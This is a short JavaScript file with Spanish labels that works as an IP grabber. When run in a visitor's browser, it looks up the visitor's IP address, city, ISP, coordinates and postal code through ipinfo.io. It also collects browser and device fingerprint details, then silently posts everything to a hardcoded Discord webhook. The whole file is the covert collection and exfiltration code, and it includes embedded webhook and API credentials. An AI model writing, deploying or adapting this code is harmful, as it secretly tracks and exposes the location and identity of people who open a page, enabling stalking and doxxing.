fetch('https://ipinfo.io/json?token=f8e54fde451c64')
    .then(response => response.json())
    .then(data => {
        var userAgent = navigator.userAgent;
        let browser;
        let browserVersion;
        let os;
        let version;

        if (userAgent.match(/Android/i)) {
            os = 'Android';
        } else if (userAgent.match(/Windows/i)) {
            os = 'Windows';
        } else {
            os = 'Unknown Device';
        }

        // Para Windows
        var windowsIndex = userAgent.indexOf("Windows");
        if (windowsIndex !== -1) {
            var versionStart = windowsIndex + 8;
            var versionEnd = userAgent.indexOf(";", versionStart);
            version = userAgent.substring(versionStart, versionEnd);
        }

        // Para Android
        var androidIndex = userAgent.indexOf("Android");
        if (androidIndex !== -1) {
            var androidVersionStart = androidIndex + 8;
            var androidVersionEnd = userAgent.indexOf(";", androidVersionStart);
            version = userAgent.substring(androidVersionStart, androidVersionEnd);
        }

        if (userAgent.match(/Chrome/i)) {
            browser = 'Chrome';
            browserVersion = userAgent.match(/Chrome\/(\d+)/)[1];
        } else if (userAgent.match(/Firefox/i)) {
            browser = 'Mozilla Firefox';
            browserVersion = userAgent.match(/Firefox\/(\d+)/)[1];
        } else if (userAgent.match(/Safari/i) && !userAgent.match(/Chrome/i)) {
            browser = 'Apple Safari';
            browserVersion = userAgent.match(/Version\/(\d+)/)[1];
        } else if (userAgent.match(/Edge/i)) {
            browser = 'Microsoft Edge';
            browserVersion = userAgent.match(/Edge\/(\d+)/)[1];
        } else if (userAgent.match(/Opera|OPR/i)) {
            browser = 'Opera';
            browserVersion = userAgent.match(/(?:Opera|OPR)\/(\d+)/)[1];
        } else if (userAgent.match(/Trident/i) || userAgent.match(/MSIE/i)) {
            browser = 'Internet Explorer';
            browserVersion = userAgent.match(/(?:Trident|MSIE)\/(\d+)/)[1];
        } else {
            browser = 'Navegador Desconocido';
            browserVersion = 'N/A';
        }

        const screenWidth = window.screen.width;
        const screenHeight = window.screen.height;
        const cpuCores = navigator.hardwareConcurrency;
        const userLanguage = navigator.language || navigator.userLanguage;
        const connectionType = navigator.connection ? navigator.connection.type : 'Desconocido';
        const deviceType = /Mobile|Tablet|iPad|iPhone|Android/.test(navigator.userAgent) ? 'Móvil/Tablet' : 'Escritorio';
        const navigationTiming = window.performance && window.performance.timing;
        let loadTime = 'No available';
        if (navigationTiming) {
            loadTime = navigationTiming.loadEventEnd - navigationTiming.navigationStart;
        }

        const ipinfo = `
            Dirección IP: ${data.ip}
            Ubicación: ${data.city}, ${data.region}, ${data.country}
            ISP: ${data.org}
            Latitud/Longitud: ${data.loc}
            Código Postal: ${data.postal}
            Zona Horaria: ${data.timezone}
            
            OS/Version: ${os} ${version}
            Device Type: ${deviceType}
            Browser/Version: ${browser} ${browserVersion}.0.0.0
            Resolution: ${screenHeight}x${screenWidth}
            CPU Cores: ${cpuCores}
            Language: ${userLanguage}
            Connection Type: ${connectionType}
            Loading Time: ${loadTime}
        `;

        const webhookUrl = 'https://discord.com/api/webhooks/1262514002462900307/-AYAvbIVTGri2O0J9Es-0b-BxGGGyJyVVGJYdTAKEHR_9iH5mWvboW2jSfAaKyNBHuLX';  // Asegúrate de añadir aquí tu URL de webhook

        const embed_message = {
            embeds: [
                {
                    thumbnail: {
                        url: 'https://images-ext-1.discordapp.net/external/zuV587fJtJifYry9FhMc2hTkbMAvvUjTJRt3Zt5vUQ0/https/qph.cf2.quoracdn.net/main-qimg-81d42d79e88d586de12b9faeddc598b8-pjlq?format=webp&width=401&height=252',
                    },
                    title: 'IP Informacion',
                    description: '```' + ipinfo + '```',
                    color: 0x000000,
                },
            ],
        };

        const message = '```IP Information' + ipinfo + '```'

        const xhr = new XMLHttpRequest();
        xhr.open('POST', webhookUrl, true);
        xhr.setRequestHeader('Content-Type', 'application/json');

        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4 && xhr.status === 200) {
                console.log('Mensaje enviado con éxito.');
            } else if (xhr.readyState === 4) {
                console.log('Successful sent message');
            }
        };

        const payload = JSON.stringify(embed_message);
        xhr.send(payload);
    });
